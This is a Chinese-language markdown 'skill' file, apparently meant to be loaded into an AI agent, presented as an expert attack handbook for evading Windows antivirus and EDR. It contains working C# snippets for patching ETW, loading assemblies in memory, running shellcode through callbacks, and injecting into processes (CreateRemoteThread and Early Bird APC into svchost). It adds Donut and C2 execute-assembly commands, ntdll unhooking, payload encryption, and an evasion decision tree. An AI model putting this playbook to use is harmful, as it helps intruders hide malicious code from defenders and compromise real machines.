# 技能：AV/EDR规避 — 专家级攻击手册

> **AI加载指令**：Windows系统下的专家级AV/EDR规避技术。涵盖AMSI绕过、ETW绕过、.NET程序集加载、shellcode执行、进程注入、解挂钩、有效载荷加密和特征规避。基础模型会漏掉针对检测的绕过链和系统调用级别的规避细节。

## 0. 相关路由

深入之前，考虑加载：

- 当权限提升工具被AV阻止时，加载 `[windows-privilege-escalation](../windows-privilege-escalation/SKILL.md)`
- 当横向移动工具触发EDR时，加载 `[windows-lateral-movement](../windows-lateral-movement/SKILL.md)`
- 当检测到Rubeus/Mimikatz时，加载 `[active-directory-kerberos-attacks](../active-directory-kerberos-attacks/SKILL.md)`
- 用于非二进制AD攻击（对AV敏感度较低），加载 `[active-directory-acl-abuse](../active-directory-acl-abuse/SKILL.md)`

### 高级参考

当需要时，也加载 `[AMSI_BYPASS_TECHNIQUES.md](./AMSI_BYPASS_TECHNIQUES.md)`

- 详细AMSI绕过代码模式（内存补丁、反射）
- PowerShell特定AMSI绕过
- .NET AMSI绕过技术

---

## 1. AMSI绕过概述

AMSI（反恶意软件扫描接口）在运行时检查PowerShell、.NET、VBScript、JScript和Office宏。

### 关键AMSI绕过类别

| 类别 | 方法 | 检测风险 | 持久化 |
|---|---|---|---|
| 内存补丁 | 补丁 `AmsiScanBuffer` 在 `amsi.dll` 中 | 中等 | 单进程 |
| 反射 | 通过.NET反射修改AMSI初始化标志 | 中等 | 单会话 |
| 字符串混淆 | 编码/分割AMSI触发字符串 | 低 | 单有效载荷 |
| PowerShell降级 | 强制PS v2（v2无AMSI） | 低 | 单会话 |
| CLM绕过 | 逃逸约束语言模式 | 中等 | 单会话 |
| COM劫持 | 重定向AMSI COM服务器 | 低 | 单用户 |

### 快速AMSI绕过（单行命令）

```powershell
# PowerShell v2降级（如果可用.NET 2.0 — v2无AMSI）
powershell -Version 2

# 基于反射（设置 amsiInitFailed = true）
# 混淆以避免静态检测 — 请参阅AMSI_BYPASS_TECHNIQUES.md获取完整模式
```

---

## 2. ETW绕过

ETW（Windows事件跟踪）将遥测数据发送给EDR。修补`EtwEventWrite`会阻止.NET程序集加载事件。

### 补丁EtwEventWrite

```csharp
// C# — 修补EtwEventWrite立即返回
var ntdll = GetModuleHandle("ntdll.dll");
var etwAddr = GetProcAddress(ntdll, "EtwEventWrite");
// 写入：ret (0xC3) 到第一个字节
VirtualProtect(etwAddr, 1, 0x40, out uint oldProtect);
Marshal.WriteByte(etwAddr, 0xC3);
VirtualProtect(etwAddr, 1, oldProtect, out _);
```

### PowerShell ETW绕过

```powershell
# 禁用脚本块日志记录（ETW提供程序）
[Reflection.Assembly]::LoadWithPartialName('System.Management.Automation')
# 设置内部字段以禁用ETW跟踪
```

---

## 3. .NET程序集加载

### 内存中Assembly.Load

```csharp
byte[] assemblyBytes = File.ReadAllBytes("tool.exe");
// 或从URL下载，从资源解密
Assembly assembly = Assembly.Load(assemblyBytes);
assembly.EntryPoint.Invoke(null, new object[] { args });
```

### Donut — 将.NET程序集转换为shellcode

```bash
# 从.NET EXE生成shellcode
donut -f tool.exe -o payload.bin -a 2 -c ToolNamespace.Program -m Main

# 带参数
donut -f Rubeus.exe -o rubeus.bin -a 2 -p "kerberoast /outfile:tgs.txt"

# 然后通过任何注入技术加载shellcode（§5）
```

### execute-assembly (C2框架)

```
# Cobalt Strike
execute-assembly /path/to/Rubeus.exe kerberoast

# Sliver
execute-assembly /path/to/SharpHound.exe -c all

# Havoc
dotnet inline-execute /path/to/tool.exe args
```

---

## 4. Shellcode执行技术

### VirtualAlloc + 回调（避免CreateThread）

```csharp
IntPtr addr = VirtualAlloc(IntPtr.Zero, (uint)sc.Length, 0x3000, 0x40);
Marshal.Copy(sc, 0, addr, sc.Length);
// 使用回调API代替CreateThread（监控较少）
EnumWindows(addr, IntPtr.Zero);
```

**用于shellcode执行的回调API**：`EnumWindows`、`EnumChildWindows`、`EnumFonts`、`EnumDesktops`、`CertEnumSystemStore`、`EnumDateFormats` — 所有这些API都接受可以指向shellcode的函数指针。

---

## 5. 进程注入技术

| 技术 | 使用的API | 检测风险 | 备注 |
|---|---|---|---|
| **CreateRemoteThread** | OpenProcess, VirtualAllocEx, WriteProcessMemory, CreateRemoteThread | 高 | 经典，监控严重 |
| **NtMapViewOfSection** | NtCreateSection, NtMapViewOfSection | 中等 | 共享内存，不太常见 |
| **进程空洞化** | CreateProcess (挂起), NtUnmapViewOfSection, WriteProcessMemory, ResumeThread | 中等 | 替换进程映像 |
| **线程劫持** | SuspendThread, SetThreadContext, ResumeThread | 中等 | 修改现有线程 |
| **早鸟** | CreateProcess (挂起), QueueUserAPC, ResumeThread | 低-中等 | APC在主线程之前 |
| **幽灵DLL空洞化** | 映射DLL节，用shellcode覆盖 | 低 | 使用合法DLL映射 |
| **模块踩踏** | LoadLibrary, 覆盖.text节 | 低 | 由合法DLL支持 |
| **事务空洞化** | NtCreateTransaction, NtCreateSection | 低 | 无可疑分配 |

### CreateRemoteThread（基本模式）

```csharp
IntPtr hProcess = OpenProcess(0x001F0FFF, false, targetPid);
IntPtr addr = VirtualAllocEx(hProcess, IntPtr.Zero, (uint)sc.Length, 0x3000, 0x40);
WriteProcessMemory(hProcess, addr, sc, (uint)sc.Length, out _);
CreateRemoteThread(hProcess, IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
```

### 早鸟APC注入

```csharp
// 创建挂起进程
STARTUPINFO si = new STARTUPINFO();
PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
CreateProcess(null, "C:\\Windows\\System32\\svchost.exe", ..., CREATE_SUSPENDED, ..., ref si, ref pi);

// 分配并写入shellcode
IntPtr addr = VirtualAllocEx(pi.hProcess, IntPtr.Zero, (uint)sc.Length, 0x3000, 0x40);
WriteProcessMemory(pi.hProcess, addr, sc, (uint)sc.Length, out _);

// 将APC排队到主线程（在主入口点之前运行）
QueueUserAPC(addr, pi.hThread, IntPtr.Zero);
ResumeThread(pi.hThread);
```

---

## 6. 解挂钩 — 绕过EDR API挂钩

### 直接系统调用（SysWhispers / HellsGate）

EDR挂钩`ntdll.dll`函数。直接系统调用通过直接调用内核来绕过挂钩。

```
正常：用户代码 → ntdll.dll (已挂钩) → 内核
直接：用户代码 → 系统调用指令 → 内核（绕过挂钩）
```

| 工具 | 方法 | 备注 |
|---|---|---|
| **SysWhispers2/3** | 编译时系统调用桩 | 静态系统调用号 |
| **HellsGate** | 运行时系统调用号解析 | 动态，更难检测 |
| **HalosGate** | 从相邻未挂钩的系统调用解析 | 处理部分挂钩 |
| **TartarusGate** | 扩展HalosGate | 更健壮的解析 |

### Fresh ntdll副本

```csharp
// 从磁盘读取干净的ntdll.dll
byte[] cleanNtdll = File.ReadAllBytes(@"C:\Windows\System32\ntdll.dll");
// 或从KnownDlls：\KnownDlls\ntdll.dll
// 或从挂起进程（创建牺牲进程，读取其ntdll）

// 用干净副本覆盖挂钩的.text节
// → ntdll中的所有EDR挂钩都被移除
```

### 间接系统调用

```
// 代替：在你的代码中syscall（可疑）
// 做跳转到ntdll.dll内部syscall指令（合法位置）
// 栈上的返回地址指向ntdll.dll，而不是你的代码
```

---

## 7. 有效载荷加密与混淆

### 加密方法

```csharp
// AES加密（首选）
using Aes aes = Aes.Create();
aes.Key = key; aes.IV = iv;
byte[] encrypted = aes.CreateEncryptor().TransformFinalBlock(shellcode, 0, shellcode.Length);

// XOR（简单，快速）
for (int i = 0; i < shellcode.Length; i++)
    shellcode[i] ^= key[i % key.Length];

// RC4（流密码，简单实现）
```

### Sleep混淆

在睡眠期间加密shellcode以避免内存扫描器。

| 技术 | 方法 |
|---|---|
| **Ekko** | ROP链 → 在睡眠期间加密堆/栈 |
| **Foliage** | 基于APC的睡眠与内存加密 |
| **DeathSleep** | 睡眠期间线程注销 |

### 分阶段加载

```
阶段1：小，加密的加载器（规避静态分析）
阶段2：在运行时下载实际有效载荷（加密）
阶段3：内存中解密 → 执行
```

---

## 8. 特征规避

### 字符串加密

```csharp
// 避免明文API名称、URL、工具名称
// 使用加密字符串，在运行时解密
string decrypted = Decrypt(encryptedApiName);
IntPtr funcPtr = GetProcAddress(GetModuleHandle("kernel32.dll"), decrypted);
```

### API哈希

```csharp
// 通过哈希解析API而不是名称（避免字符串检测）
// 哈希"VirtualAlloc" → 0x91AFCA54
IntPtr func = GetProcAddressByHash(module, 0x91AFCA54);
```

### 元数据移除

```bash
# 移除.NET元数据
ConfuserEx / .NET Reactor / Obfuscar

# 移除PE元数据（时间戳、丰富头部、调试信息）
# 修改编译时间戳
# 移除PDB路径
```

### C2框架规避

| 框架 | 关键规避特性 |
|---|---|
| **Cobalt Strike** | 可塑C2配置文件、HTTP/S流量整形、睡眠抖动、PE规避 |
| **Sliver** | 多种协议（mTLS、WireGuard、DNS）、无stager、内置混淆 |
| **Havoc** | 间接系统调用、睡眠混淆、模块踩踏 |
| **Brute Ratel** | Badger代理、系统调用规避、内置ETW/AMSI绕过 |

---

## 9. AV/EDR规避决策树

```
需要在受保护的主机上执行工具/有效载荷
│
├── 基于PowerShell的有效载荷？
│   ├── AMSI阻止？ → 首先进行AMSI绕过（§1）
│   │   ├── .NET 2.0可用？ → PS v2降级（无AMSI）
│   │   ├── 内存修补AmsiScanBuffer
│   │   └── 基于反射的绕过
│   ├── 脚本块日志记录？ → ETW绕过（§2）
│   └── 约束语言模式？ → CLM绕过或切换到C#
│
├── .NET程序集（Rubeus、SharpHound等）？
│   ├── 直接执行被阻止？
│   │   ├── 内存中Assembly.Load (§3)
│   │   ├── 用Donut将.NET程序集转换为shellcode (§3)
│   │   └── 使用C2 execute-assembly (§3)
│   └── 仍然检测到？
│       ├── 混淆程序集 (ConfuserEx)
│       ├── 修改源代码 + 重新编译
│       └── 如果CS使用BOFs（信标对象文件）
│
├── 需要shellcode执行？
│   ├── 基本 → VirtualAlloc + 回调 (§4)
│   ├── 需要注入 → 根据OPSEC选择技术 (§5)
│   │   ├── 低检测需求 → 模块踩踏或幽灵DLL
│   │   ├── 中等 → 早鸟APC或NtMapViewOfSection
│   │   └── 快速且肮脏 → CreateRemoteThread
│   └── 内存扫描器检测有效载荷？
│       ├── 加密有效载荷 → 仅在执行时解密 (§7)
│       └── Sleep混淆 (Ekko/Foliage) (§7)
│
├── EDR挂钩ntdll.dll？
│   ├── 直接系统调用 (SysWhispers3/HellsGate) (§6)
│   ├── 从磁盘/KnownDlls获取新鲜ntdll副本 (§6)
│   └── 间接系统调用（返回到ntdll指令） (§6)
│
├── 特征检测？
│   ├── 已知工具特征 → 修改 + 重新编译
│   ├── 基于字符串 → 字符串加密 / API哈希 (§8)
│   ├── PE元数据 → 移除/修改 (§8)
│   └── 行为 → 改变执行流程，添加垃圾代码
│
└── 所有本地规避失败？
    ├── 使用Living-off-the-Land (LOLBins)：certutil、mshta、regsvr32
    ├── 使用合法管理员工具 (PsExec、WMI、WinRM)
    └── 切换到文件系统/内存技术
```
